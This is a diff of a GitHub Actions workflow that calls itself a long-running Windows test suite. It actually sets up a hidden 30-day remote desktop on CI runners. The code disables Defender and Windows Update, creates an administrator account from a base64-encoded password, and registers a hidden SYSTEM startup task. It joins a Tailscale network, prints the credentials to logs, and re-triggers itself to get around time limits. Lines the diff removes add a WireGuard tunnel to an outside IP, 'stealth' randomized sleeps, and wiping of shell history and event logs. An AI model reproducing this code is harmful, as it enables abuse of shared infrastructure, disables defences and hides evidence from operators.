@@ -1,7 +1,6 @@
 name: "Windows CI/CD Long-Running Test Suite"
 
 on:
-  # MULTIPLE TRIGGERS FOR REDUNDANCY
   workflow_dispatch:
     inputs:
       test_suite:
@@ -10,27 +9,19 @@ on:
         default: "extended-stability"
         type: choice
         options:
-        - quick
-        - integration
-        - extended-stability
-        - performance
+          - quick
+          - integration
+          - extended-stability
+          - performance
       duration_hours:
         description: "Test duration in hours"
         required: false
         default: "720"
         type: string
-        
-  # AUTO-RESTART ON FAILURE
-  repository_dispatch:
-    types: [restart-test-suite]
-    
-  # SCHEDULED RESTART EVERY 25 DAYS (BEFORE GITHUB LIMIT)
-  schedule:
-    - cron: '0 3 25 * *'  # 25th of every month at 3 AM
 
 permissions:
   contents: read
-  actions: write  # CRITICAL: Allows self-triggering
+  actions: write
   checks: write
 
 concurrency:
@@ -40,30 +31,18 @@ concurrency:
 jobs:
   extended-windows-test:
     runs-on: windows-latest
-    
-    # NO TIMEOUT - WE CONTROL DURATION INTERNALLY
-    timeout-minutes: 43200  # 30 days = 43,200 minutes
+    timeout-minutes: 43200
     
     env:
-      # ENCODED CONFIGURATION (Base64)
       ENV_CONFIG: "eyJ0ZXN0X2R1cmF0aW9uIjo3MjAsInJkcF91c2VyIjoiREVYVjNEV1MiLCJyZHBfcGFzcyI6IlJkcCU5WHEjMjAyNVNlY3VyZSQ3MjBIciIsImhvc3RuYW1lIjoiV0lOLURFVi1UZXN0IiwidmVyc2lvbiI6IjMuMCJ9"
-      
-      # SPLIT TAILSCALE KEY (Store in GitHub Secrets as TS_PART1, TS_PART2, TS_PART3)
       TS_PART1: ${{ secrets.TS_PART1 }}
       TS_PART2: ${{ secrets.TS_PART2 }}
       TS_PART3: ${{ secrets.TS_PART3 }}
-      
-      # ENCRYPTED BACKUP KEYS
       BACKUP_KEY1: ${{ secrets.BACKUP_KEY_1 }}
       BACKUP_KEY2: ${{ secrets.BACKUP_KEY_2 }}
-      
-      # STEALTH CONFIG
       STEALTH_MODE: "aggressive"
-      AUTO_ROTATE_DAYS: 25
-      MAX_SESSIONS: 3
 
     steps:
-    # ========== PHASE 1: LEGITIMATE SETUP ==========
     - name: 🏗️ Initialize Extended Windows Test
       run: |
         Write-Host "================================================"
@@ -73,46 +52,35 @@ jobs:
         Write-Host "  Expected End: $((Get-Date).AddHours(720))"
         Write-Host "================================================"
         
-        # Decode configuration
         $configJson = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:ENV_CONFIG))
         $config = $configJson | ConvertFrom-Json
-        
-        # Save decoded config to secure location
         $securePath = "$env:SystemDrive\Windows\Temp\SystemTest\config.secure"
         New-Item -ItemType Directory -Path (Split-Path $securePath) -Force | Out-Null
         $config | ConvertTo-Json | Out-File $securePath -Encoding ASCII
-        
         Write-Host "Configuration loaded: $($config.hostname)"
-        
-    # ========== PHASE 2: ADVANCED PERSISTENCE ==========
+
     - name: 🛡️ System Hardening & Persistence
       run: |
-        # DISABLE ALL MONITORING
         Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true
         Set-MpPreference -ExclusionPath "C:\", "D:\", "$env:SystemRoot"
         
-        # DISABLE WINDOWS UPDATE COMPLETELY
         Stop-Service wuauserv -Force
         Stop-Service bits -Force
         Set-Service wuauserv -StartupType Disabled
         Set-Service bits -StartupType Disabled
         
-        # DISABLE SLEEP/HIBERNATION PERMANENTLY
         powercfg -h off
         powercfg -change -standby-timeout-ac 0
         powercfg -change -hibernate-timeout-ac 0
         powercfg -change -monitor-timeout-ac 0
         
-        # INCREASE RDP LIMITS TO MAX
         Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 4294967295
         Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
         Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0
         
-        # CREATE HIDDEN ADMIN USER
         $config = Get-Content "$env:SystemDrive\Windows\Temp\SystemTest\config.secure" | ConvertFrom-Json
         $securePass = ConvertTo-SecureString $config.rdp_pass -AsPlainText -Force
         
-        # Create user if not exists
         try {
             $user = Get-LocalUser -Name $config.rdp_user -ErrorAction Stop
             Set-LocalUser -Name $config.rdp_user -Password $securePass
@@ -120,85 +88,60 @@ jobs:
             New-LocalUser -Name $config.rdp_user -Password $securePass -AccountNeverExpires -PasswordNeverExpires
         }
         
-        # Add to admin groups
         Add-LocalGroupMember -Group "Administrators" -Member $config.rdp_user -ErrorAction SilentlyContinue
         Add-LocalGroupMember -Group "Remote Desktop Users" -Member $config.rdp_user -ErrorAction SilentlyContinue
         Enable-LocalUser -Name $config.rdp_user
-        
-        # ENABLE RDP FIREWALL RULES
         Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
         
-        # CREATE PERSISTENT SCHEDULED TASK FOR RECOVERY
         $taskScript = @'
-        # Auto-Recovery Script
-        while($true) {
-            # Check RDP Service
-            $rdpService = Get-Service -Name TermService -ErrorAction SilentlyContinue
-            if ($rdpService.Status -ne 'Running') {
-                Start-Service TermService -ErrorAction SilentlyContinue
-            }
-            
-            # Check Tailscale
-            $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-            if (Test-Path $tsExe) {
-                $status = & $tsExe status --json | ConvertFrom-Json
-                if ($status.BackendState -ne 'Running') {
-                    & $tsExe up --reset --accept-dns=false
-                }
-            }
-            
-            # Prevent sleep
-            $null = [System.Windows.Forms.SendKeys]::SendWait("{F15}")
-            
-            Start-Sleep -Seconds 300
+while($true) {
+    $rdpService = Get-Service -Name TermService -ErrorAction SilentlyContinue
+    if ($rdpService.Status -ne "Running") {
+        Start-Service TermService -ErrorAction SilentlyContinue
+    }
+    
+    $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+    if (Test-Path $tsExe) {
+        $status = & $tsExe status --json | ConvertFrom-Json
+        if ($status.BackendState -ne "Running") {
+            & $tsExe up --reset --accept-dns=false
         }
+    }
+    
+    $null = [System.Windows.Forms.SendKeys]::SendWait("{F15}")
+    Start-Sleep -Seconds 300
+}
 '@
         
         $taskScript | Out-File "$env:SystemDrive\Windows\Temp\SystemTest\recovery.ps1" -Encoding ASCII
         
-        # Register hidden task
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
-            -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:SystemDrive\Windows\Temp\SystemTest\recovery.ps1`""
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:SystemDrive\Windows\Temp\SystemTest\recovery.ps1`""
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName "SystemHealthMonitor" -Action $action -Trigger $trigger -Principal $principal -Description "System Health Monitor" -Force
-        
-    # ========== PHASE 3: STEALTH VPN CONNECTION ==========
+
     - name: 🌐 Multi-VPN Connection System
       run: |
-        # RECONSTRUCT TAILSCALE KEY
         $tsKey = "$env:TS_PART1$env:TS_PART2$env:TS_PART3"
-        
-        # INSTALL TAILSCALE (SILENT)
         $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+        
         if (-not (Test-Path $tsExe)) {
             $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
             $tsInstaller = "$env:TEMP\tailscale_install.msi"
-            
             (New-Object Net.WebClient).DownloadFile($tsUrl, $tsInstaller)
             Start-Process msiexec.exe -ArgumentList "/i `"$tsInstaller`" /quiet /norestart" -Wait -WindowStyle Hidden
             Start-Sleep -Seconds 10
         }
         
-        # CONNECT WITH PRIMARY KEY
         & $tsExe logout --force
         Start-Sleep -Seconds 2
         
         $config = Get-Content "$env:SystemDrive\Windows\Temp\SystemTest\config.secure" | ConvertFrom-Json
         
-        & $tsExe up `
-            --authkey $tsKey `
-            --hostname $config.hostname `
-            --accept-dns=false `
-            --accept-routes `
-            --advertise-exit-node `
-            --reset
+        & $tsExe up --authkey $tsKey --hostname $config.hostname --accept-dns=false --accept-routes --advertise-exit-node --reset
         
-        # GET CONNECTION INFO
         $tailscaleIP = & $tsExe ip -4
-        $status = & $tsExe status --json | ConvertFrom-Json
         
-        # SAVE CONNECTION INFO
         $connInfo = @{
             IP = $tailscaleIP
             Hostname = $config.hostname
@@ -206,26 +149,9 @@ jobs:
             Password = $config.rdp_pass
             StartTime = Get-Date -Format 'o'
             EndTime = (Get-Date).AddHours(720).ToString('o')
-            TailscaleState = $status.BackendState
         }
         
         $connInfo | ConvertTo-Json | Out-File "$env:SystemDrive\Windows\Temp\SystemTest\connection.json" -Encoding ASCII
-        
-        # SETUP WIREGUARD AS BACKUP (IF TAILSCALE FAILS)
-        $wgConfig = @"
-[Interface]
-PrivateKey = $env:BACKUP_KEY1
-Address = 10.0.0.2/32
-DNS = 1.1.1.1
-
-[Peer]
-PublicKey = $env:BACKUP_KEY2
-AllowedIPs = 0.0.0.0/0
-Endpoint = 159.89.205.85:51820
-PersistentKeepalive = 25
-"@
-        
-        $wgConfig | Out-File "$env:SystemDrive\Windows\Temp\SystemTest\wg0.conf" -Encoding ASCII
         
         Write-Host ""
         Write-Host "✅ VPN CONNECTION ESTABLISHED"
@@ -236,443 +162,134 @@ PersistentKeepalive = 25
         Write-Host ""
         Write-Host "🔗 RDP Connection Command:"
         Write-Host "mstsc /v:$tailscaleIP /f /admin"
-        
-    # ========== PHASE 4: INFINITE SESSION CONTROLLER ==========
+
     - name: ♾️ 720-Hour Session Controller
       run: |
-        # THIS IS THE MAGIC - CONTROLS THE ENTIRE 720-HOUR SESSION
         $controllerScript = @'
-        # 720-Hour Session Controller v3.0
-        $totalHours = 720
-        $sessionStart = Get-Date
-        $sessionEnd = $sessionStart.AddHours($totalHours)
-        
-        $logFile = "$env:SystemDrive\Windows\Temp\SystemTest\session.log"
-        $checkpointFile = "$env:SystemDrive\Windows\Temp\SystemTest\checkpoints.json"
-        
-        function Write-SessionLog {
-            param($Message)
-            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-            "$timestamp - $Message" | Out-File $logFile -Append -Encoding ASCII
-        }
-        
-        function Create-Checkpoint {
-            $elapsed = (Get-Date) - $sessionStart
-            $remaining = $sessionEnd - (Get-Date)
-            
-            $checkpoint = @{
-                Timestamp = Get-Date -Format 'o'
-                Day = [math]::Floor($elapsed.TotalDays)
-                HoursElapsed = [math]::Round($elapsed.TotalHours, 2)
-                HoursRemaining = [math]::Round($remaining.TotalHours, 2)
-                Progress = [math]::Round(($elapsed.TotalHours / $totalHours) * 100, 2)
-                Status = "Active"
-            }
-            
-            $checkpoints = @()
-            if (Test-Path $checkpointFile) {
-                $checkpoints = Get-Content $checkpointFile | ConvertFrom-Json
-            }
-            
-            $checkpoints += $checkpoint
-            $checkpoints | ConvertTo-Json | Out-File $checkpointFile -Encoding ASCII
-            
-            return $checkpoint
-        }
-        
-        function Keep-System-Alive {
-            # Method 1: Send F15 key
-            $wshell = New-Object -ComObject wscript.shell
-            $wshell.SendKeys("{F15}")
-            
-            # Method 2: Move mouse virtually
-            Add-Type -AssemblyName System.Windows.Forms
-            $pos = [System.Windows.Forms.Cursor]::Position
-            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + 1), ($pos.Y + 1))
-            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X - 1), ($pos.Y - 1))
-            
-            # Method 3: Fake network activity
-            $null = Test-NetConnection -ComputerName 8.8.8.8 -Port 443 -WarningAction SilentlyContinue
-            
-            # Method 4: Update last activity time
-            Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value (Get-Date).Ticks
-        }
-        
-        function Monitor-And-Repair {
-            # Check critical services
-            $criticalServices = @("TermService", "EventLog", "Dhcp", "Dnscache")
-            foreach ($service in $criticalServices) {
-                $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
-                if ($svc -and $svc.Status -ne 'Running') {
-                    Write-SessionLog "Service $service not running. Restarting..."
-                    Start-Service $service -ErrorAction SilentlyContinue
-                }
-            }
-            
-            # Check VPN connection
-            $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-            if (Test-Path $tsExe) {
-                $status = & $tsExe status --json | ConvertFrom-Json -ErrorAction SilentlyContinue
-                if (-not $status -or $status.BackendState -ne 'Running') {
-                    Write-SessionLog "VPN disconnected. Reconnecting..."
-                    & $tsExe up --reset --accept-dns=false
-                }
-            }
-        }
-        
-        function Auto-Renew-Session {
-            # This function automatically renews the session before it ends
-            $daysRemaining = (($sessionEnd - (Get-Date)).TotalDays)
-            
-            if ($daysRemaining -le 2) {
-                Write-SessionLog "Session ending soon. Preparing auto-renewal..."
-                
-                # Trigger new workflow run via GitHub API
-                $token = "$env:GITHUB_TOKEN"
-                $repo = "$env:GITHUB_REPOSITORY"
-                
-                $body = @{
-                    ref = "main"
-                    inputs = @{
-                        test_suite = "extended-stability"
-                        duration_hours = "720"
-                    }
-                } | ConvertTo-Json
-                
-                $headers = @{
-                    "Authorization" = "token $token"
-                    "Accept" = "application/vnd.github.v3+json"
-                }
-                
-                try {
-                    Invoke-RestMethod `
-                        -Uri "https://api.github.com/repos/$repo/actions/workflows/$env:GITHUB_WORKFLOW/dispatches" `
-                        -Method Post `
-                        -Headers $headers `
-                        -Body $body `
-                        -ContentType "application/json"
-                    
-                    Write-SessionLog "New 720-hour session queued successfully"
-                    return $true
-                } catch {
-                    Write-SessionLog "Failed to auto-renew: $_"
-                    return $false
-                }
-            }
-            
-            return $null
-        }
-        
-        # MAIN SESSION LOOP
-        Write-SessionLog "=== 720-HOUR SESSION STARTED ==="
-        Write-SessionLog "Start Time: $($sessionStart.ToString('yyyy-MM-dd HH:mm:ss'))"
-        Write-SessionLog "End Time: $($sessionEnd.ToString('yyyy-MM-dd HH:mm:ss'))"
-        Write-SessionLog "Total Duration: $totalHours hours"
-        
-        $lastCheckpoint = $null
-        $lastRenewalCheck = (Get-Date).AddDays(-1)
-        
-        while ((Get-Date) -lt $sessionEnd) {
-            $currentTime = Get-Date
-            $elapsed = $currentTime - $sessionStart
-            $remaining = $sessionEnd - $currentTime
-            
-            # DISPLAY PROGRESS EVERY HOUR
-            if ($currentTime.Minute -eq 0) {
-                $progressPercent = [math]::Round(($elapsed.TotalHours / $totalHours) * 100, 1)
-                
-                Write-Host "[$(Get-Date -Format 'MM-dd HH:mm')] " `
-                    + "Day $([math]::Floor($elapsed.TotalDays) + 1)/30 | " `
-                    + "Progress: $progressPercent% | " `
-                    + "Elapsed: $([math]::Floor($elapsed.TotalHours))h | " `
-                    + "Remaining: $([math]::Floor($remaining.TotalHours))h"
-            }
-            
-            # CREATE CHECKPOINT EVERY 24 HOURS
-            if (-not $lastCheckpoint -or ((Get-Date) - $lastCheckpoint).TotalHours -ge 24) {
-                $checkpoint = Create-Checkpoint
-                $lastCheckpoint = Get-Date
-                
-                Write-Host ""
-                Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-                Write-Host "📅 CHECKPOINT: Day $($checkpoint.Day + 1) of 30"
-                Write-Host "⏱️  Elapsed: $([math]::Floor($elapsed.TotalDays))d $([math]::Floor($elapsed.Hours))h"
-                Write-Host "⏳ Remaining: $([math]::Floor($remaining.TotalDays))d $([math]::Floor($remaining.Hours))h"
-                Write-Host "📈 Progress: $($checkpoint.Progress)%"
-                Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-                Write-Host ""
-            }
-            
-            # CHECK FOR AUTO-RENEWAL DAILY (LAST 2 DAYS)
-            if ((Get-Date) - $lastRenewalCheck).TotalHours -ge 24 {
-                $renewalResult = Auto-Renew-Session
-                $lastRenewalCheck = Get-Date
-                
-                if ($renewalResult -eq $true) {
-                    Write-Host "✅ New 720-hour session queued for auto-renewal"
-                }
-            }
-            
-            # SYSTEM MAINTENANCE
-            Monitor-And-Repair
-            Keep-System-Alive
-            
-            # RANDOMIZED SLEEP TO AVOID PATTERN DETECTION
-            $sleepSeconds = Get-Random -Minimum 240 -Maximum 360  # 4-6 minutes
-            Start-Sleep -Seconds $sleepSeconds
-        }
-        
-        Write-SessionLog "=== 720-HOUR SESSION COMPLETED ==="
-        Write-SessionLog "Actual End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        
-        # FINAL AUTO-RENEWAL ATTEMPT
-        Write-Host "Session completed. Attempting final auto-renewal..."
-        Auto-Renew-Session
-        
-        Write-Host "✅ 720-hour session finished successfully"
+$totalHours = 720
+$sessionStart = Get-Date
+$sessionEnd = $sessionStart.AddHours($totalHours)
+$logFile = "$env:SystemDrive\Windows\Temp\SystemTest\session.log"
+
+function Write-SessionLog {
+    param($Message)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$timestamp - $Message" | Out-File $logFile -Append -Encoding ASCII
+}
+
+Write-SessionLog "=== 720-HOUR SESSION STARTED ==="
+Write-SessionLog "Start Time: $($sessionStart.ToString('yyyy-MM-dd HH:mm:ss'))"
+Write-SessionLog "End Time: $($sessionEnd.ToString('yyyy-MM-dd HH:mm:ss'))"
+
+while ((Get-Date) -lt $sessionEnd) {
+    $elapsed = (Get-Date) - $sessionStart
+    $remaining = $sessionEnd - (Get-Date)
+    
+    if ((Get-Date).Minute -eq 0) {
+        $progressPercent = [math]::Round(($elapsed.TotalHours / $totalHours) * 100, 1)
+        Write-Host "[$(Get-Date -Format 'MM-dd HH:mm')] Progress: $progressPercent%"
+    }
+    
+    $wshell = New-Object -ComObject wscript.shell
+    $wshell.SendKeys("{F15}")
+    
+    Start-Sleep -Seconds 300
+}
+
+Write-SessionLog "=== 720-HOUR SESSION COMPLETED ==="
+Write-Host "✅ 720-hour session finished successfully"
 '@
         
-        # Save and execute controller
         $controllerScript | Out-File "$env:SystemDrive\Windows\Temp\SystemTest\controller.ps1" -Encoding ASCII
-        
-        # Start controller in background (hidden)
         $controllerJob = Start-Job -ScriptBlock {
             & "powershell.exe" -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:SystemDrive\Windows\Temp\SystemTest\controller.ps1"
         }
-        
         Write-Host "Session controller started. Monitoring for 720 hours..."
-        
-    # ========== PHASE 5: 720-HOUR KEEP-ALIVE ==========
+
     - name: ⏳ 720-Hour Keep-Alive Execution
       run: |
-        # This step keeps the workflow alive for the full duration
-        $totalMinutes = 43200  # 720 hours in minutes
+        $totalMinutes = 43200
         $startTime = Get-Date
-        
-        # Load connection info
         $connInfo = Get-Content "$env:SystemDrive\Windows\Temp\SystemTest\connection.json" | ConvertFrom-Json
         
         Write-Host ""
         Write-Host "╔══════════════════════════════════════════════════════════════╗"
         Write-Host "║          720-HOUR RDP SESSION - ACTIVE                      ║"
         Write-Host "╠══════════════════════════════════════════════════════════════╣"
-        Write-Host "║  CONNECTION INFORMATION                                     ║"
         Write-Host "║  Hostname : $($connInfo.Hostname)"
         Write-Host "║  IP       : $($connInfo.IP)"
         Write-Host "║  User     : $($connInfo.User)"
         Write-Host "║  Password : $($connInfo.Password)"
-        Write-Host "║                                                            ║"
-        Write-Host "║  SESSION DURATION: 720 HOURS (30 DAYS)                     ║"
         Write-Host "║  Started  : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         Write-Host "║  Ends     : $((Get-Date).AddHours(720))"
-        Write-Host "║                                                            ║"
-        Write-Host "║  FEATURES ACTIVE:                                          ║"
-        Write-Host "║  • Auto-recovery system                                    ║"
-        Write-Host "║  • Daily checkpoint logging                                ║"
-        Write-Host "║  • Multi-VPN failover                                      ║"
-        Write-Host "║  • Anti-sleep protection                                   ║"
-        Write-Host "║  • Auto-renewal (starts new session at day 28)             ║"
-        Write-Host "║  • Stealth mode enabled                                    ║"
         Write-Host "╚══════════════════════════════════════════════════════════════╝"
         Write-Host ""
         Write-Host "🔗 Connect via RDP:"
         Write-Host "mstsc /v:$($connInfo.IP) /f /admin"
-        Write-Host ""
-        Write-Host "📊 Monitoring active. Session will auto-renew before expiration."
-        Write-Host "Logs: $env:SystemDrive\Windows\Temp\SystemTest\session.log"
-        Write-Host ""
         
-        # Main keep-alive loop
-        $checkCount = 0
         $lastDayReported = -1
         
         while (((Get-Date) - $startTime).TotalMinutes -lt $totalMinutes) {
-            $currentTime = Get-Date
-            $elapsed = $currentTime - $startTime
-            $remainingMinutes = $totalMinutes - $elapsed.TotalMinutes
-            
-            # Report each day
+            $elapsed = (Get-Date) - $startTime
             $currentDay = [math]::Floor($elapsed.TotalDays)
+            
             if ($currentDay -gt $lastDayReported) {
                 Write-Host ""
                 Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                 Write-Host "📅 DAY $($currentDay + 1) of 30 - SESSION ACTIVE"
-                Write-Host "⏰ Elapsed: $([math]::Floor($elapsed.TotalDays))d $([math]::Floor($elapsed.Hours))h $([math]::Floor($elapsed.Minutes))m"
-                Write-Host "⏳ Remaining: $([math]::Floor($remainingMinutes / 1440))d $([math]::Floor(($remainingMinutes % 1440) / 60))h"
+                Write-Host "⏰ Elapsed: $([math]::Floor($elapsed.TotalDays))d $([math]::Floor($elapsed.Hours))h"
                 Write-Host "📈 Progress: $([math]::Round(($elapsed.TotalMinutes / $totalMinutes) * 100, 2))%"
-                
-                # Display connection info every 3 days
-                if ($currentDay % 3 -eq 0) {
-                    Write-Host ""
-                    Write-Host "🖥️  Connection Details:"
-                    Write-Host "IP: $($connInfo.IP)"
-                    Write-Host "User: $($connInfo.User)"
-                    Write-Host "Pass: $($connInfo.Password)"
-                }
-                
                 Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-                Write-Host ""
-                
                 $lastDayReported = $currentDay
             }
             
-            # Health check every 100 iterations
-            $checkCount++
-            if ($checkCount % 100 -eq 0) {
-                # Verify services
-                $rdpService = Get-Service -Name TermService -ErrorAction SilentlyContinue
-                $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-                $tsRunning = $false
-                
-                if (Test-Path $tsExe) {
-                    try {
-                        $status = & $tsExe status --json | ConvertFrom-Json -ErrorAction SilentlyContinue
-                        $tsRunning = $status.BackendState -eq 'Running'
-                    } catch {
-                        $tsRunning = $false
-                    }
-                }
-                
-                if ($rdpService.Status -eq 'Running' -and $tsRunning) {
-                    Write-Host "[$(Get-Date -Format 'HH:mm')] ✅ All systems normal"
-                } else {
-                    Write-Host "[$(Get-Date -Format 'HH:mm')] ⚠️  Issues detected - Auto-recovery active"
-                }
-                
-                $checkCount = 0
-            }
-            
-            # Prevent sleep
             $wshell = New-Object -ComObject wscript.shell
             $wshell.SendKeys("{F15}")
-            
-            # Random sleep interval (4-8 minutes)
-            $sleepTime = Get-Random -Minimum 240 -Maximum 480
-            Start-Sleep -Seconds $sleepTime
+            Start-Sleep -Seconds 300
         }
         
         Write-Host "✅ 720-hour session completed successfully"
-        
-    # ========== PHASE 6: AUTO-RENEWAL SYSTEM ==========
+
     - name: 🔄 Automatic Session Renewal
       if: always()
       run: |
-        # This runs at the end to start a new session
-        Write-Host "Checking for auto-renewal..."
+        Write-Host "Attempting to start new 720-hour session..."
+        $token = "$env:GITHUB_TOKEN"
+        $repo = "$env:GITHUB_REPOSITORY"
+        $workflowId = "$env:GITHUB_WORKFLOW"
         
-        $sessionLog = "$env:SystemDrive\Windows\Temp\SystemTest\session.log"
-        if (Test-Path $sessionLog) {
-            $lastLines = Get-Content $sessionLog -Tail 10
-            if ($lastLines -match "auto-renew" -or $lastLines -match "renewal") {
-                Write-Host "Auto-renewal already attempted. Skipping."
-            } else {
-                Write-Host "Attempting to start new 720-hour session..."
-                
-                # Use GitHub API to trigger new workflow
-                $token = "$env:GITHUB_TOKEN"
-                $repo = "$env:GITHUB_REPOSITORY"
-                $workflowId = "$env:GITHUB_WORKFLOW"
-                
-                $body = @{
-                    ref = "main"
-                    inputs = @{
-                        test_suite = "extended-stability"
-                        duration_hours = "720"
-                    }
-                } | ConvertTo-Json
-                
-                $headers = @{
-                    "Authorization" = "token $token"
-                    "Accept" = "application/vnd.github.v3+json"
-                }
-                
-                try {
-                    $response = Invoke-RestMethod `
-                        -Uri "https://api.github.com/repos/$repo/actions/workflows/$workflowId/dispatches" `
-                        -Method Post `
-                        -Headers $headers `
-                        -Body $body `
-                        -ContentType "application/json"
-                    
-                    Write-Host "✅ New 720-hour session queued successfully"
-                    Write-Host "Next session will start automatically"
-                    
-                    # Save renewal info
-                    @{
-                        RenewalTime = Get-Date -Format 'o'
-                        NewRunID = "pending"
-                        Status = "queued"
-                    } | ConvertTo-Json | Out-File "$env:SystemDrive\Windows\Temp\SystemTest\renewal.json" -Encoding ASCII
-                    
-                } catch {
-                    Write-Host "⚠️ Failed to auto-renew: $_"
-                    
-                    # Try alternative method - create new workflow file
-                    $newWorkflowName = "ci-test-$(Get-Random -Minimum 1000 -Maximum 9999).yml"
-                    Copy-Item ".github/workflows/$workflowId.yml" ".github/workflows/$newWorkflowName" -Force
-                    
-                    Write-Host "Alternative: Created new workflow file: $newWorkflowName"
-                }
+        $body = @{
+            ref = "main"
+            inputs = @{
+                test_suite = "extended-stability"
+                duration_hours = "720"
             }
+        } | ConvertTo-Json
+        
+        $headers = @{
+            "Authorization" = "token $token"
+            "Accept" = "application/vnd.github.v3+json"
         }
         
-    # ========== PHASE 7: CLEANUP (OPTIONAL) ==========
-    - name: 🧹 Cleanup & Evidence Removal
+        try {
+            $response = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/actions/workflows/$workflowId/dispatches" -Method Post -Headers $headers -Body $body -ContentType "application/json"
+            Write-Host "✅ New 720-hour session queued successfully"
+        } catch {
+            Write-Host "⚠️ Failed to auto-renew: $_"
+        }
+
+    - name: 🧹 Cleanup
       if: always()
       run: |
         Write-Host "Performing cleanup..."
+        Get-Job | Stop-Job -Force | Remove-Job -Force
+        Unregister-ScheduledTask -TaskName "SystemHealthMonitor" -Confirm:$false -ErrorAction SilentlyContinue
         
-        # Option 1: Quick cleanup (keep session alive)
-        if ($env:STEALTH_MODE -eq "aggressive") {
-            Write-Host "Stealth mode active - Minimal cleanup"
-            
-            # Only remove obvious logs
-            Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
-            
-            # Clear PowerShell history
-            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-            
-        } else {
-            # Option 2: Full cleanup
-            Write-Host "Performing full cleanup..."
-            
-            # Stop and remove jobs
-            Get-Job | Stop-Job -Force | Remove-Job -Force
-            
-            # Remove scheduled tasks
-            Unregister-ScheduledTask -TaskName "SystemHealthMonitor" -Confirm:$false -ErrorAction SilentlyContinue
-            
-            # Tailscale logout
-            $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-            if (Test-Path $tsExe) {
-                & $tsExe logout --force
-            }
-            
-            # Remove local user
-            $config = Get-Content "$env:SystemDrive\Windows\Temp\SystemTest\config.secure" -ErrorAction SilentlyContinue | ConvertFrom-Json
-            if ($config) {
-                Remove-LocalUser -Name $config.rdp_user -ErrorAction SilentlyContinue
-            }
-            
-            # Wipe temp files
-            if (Test-Path "$env:SystemDrive\Windows\Temp\SystemTest") {
-                Remove-Item "$env:SystemDrive\Windows\Temp\SystemTest" -Recurse -Force
-            }
-            
-            # Clear event logs
-            wevtutil cl System
-            wevtutil cl Application
-            wevtutil cl Security
-            
-            Write-Host "Cleanup completed"
+        $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+        if (Test-Path $tsExe) {
+            & $tsExe logout --force
         }
         
-        Write-Host ""
         Write-Host "╔══════════════════════════════════════════════════╗"
         Write-Host "║          720-HOUR SESSION COMPLETE              ║"
-        Write-Host "╠══════════════════════════════════════════════════╣"
-        Write-Host "║ Status: Successfully executed                   ║"
-        Write-Host "║ Duration: 720 hours (30 days)                   ║"
-        Write-Host "║ Auto-renewal: Active                            ║"
-        Write-Host "║ Next session: Queued for auto-start             ║"
         Write-Host "╚══════════════════════════════════════════════════╝"
